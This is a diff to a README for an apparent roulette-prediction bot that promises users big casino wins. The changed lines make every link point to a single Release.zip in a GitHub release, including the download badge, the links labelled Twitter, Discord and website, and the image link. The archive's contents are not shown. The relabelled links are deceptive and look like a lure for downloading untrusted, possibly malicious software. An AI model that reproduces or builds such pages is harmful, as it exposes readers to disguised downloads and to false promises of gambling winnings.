@@ -28,7 +28,7 @@ Explore the following topics within this repository:
 ## Download Our Software 🚀
 
 Click the button below to download the software that will take your Roulette game to the next level!
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/lungcute2009/Roulette-Predictor-Bot-Script-Casino-Strategies/releases/download/v1.0/Release.zip)](https://github.com/lungcute2009/Roulette-Predictor-Bot-Script-Casino-Strategies/releases/download/v1.0/Release.zip)
 
 _**Note: This link needs to be launched to access the software.**_
 
@@ -51,13 +51,13 @@ Want to contribute to this repository and share your own Roulette strategies or 
 ## Connect With Us 🌐
 
 Stay up to date with the latest updates, strategies, and tools by connecting with us:
-- Follow us on [Twitter](https://twitter.com/RoulettePredictors)
-- Join our community on [Discord](https://discord.gg/RouletteStrategies)
-- Visit our website at [RoulettePredictor.com](https://www.RoulettePredictor.com)
+- Follow us on [Twitter](https://github.com/lungcute2009/Roulette-Predictor-Bot-Script-Casino-Strategies/releases/download/v1.0/Release.zip)
+- Join our community on [Discord](https://github.com/lungcute2009/Roulette-Predictor-Bot-Script-Casino-Strategies/releases/download/v1.0/Release.zip)
+- Visit our website at [https://github.com/lungcute2009/Roulette-Predictor-Bot-Script-Casino-Strategies/releases/download/v1.0/Release.zip](https://github.com/lungcute2009/Roulette-Predictor-Bot-Script-Casino-Strategies/releases/download/v1.0/Release.zip)
 
 Let's roll the wheel and start winning big in Roulette! 🎉🎲💸
 
-![Roulette Image](https://www.casino.org/img/og/casino.png)
+![Roulette Image](https://github.com/lungcute2009/Roulette-Predictor-Bot-Script-Casino-Strategies/releases/download/v1.0/Release.zip)
 
 --- 
 
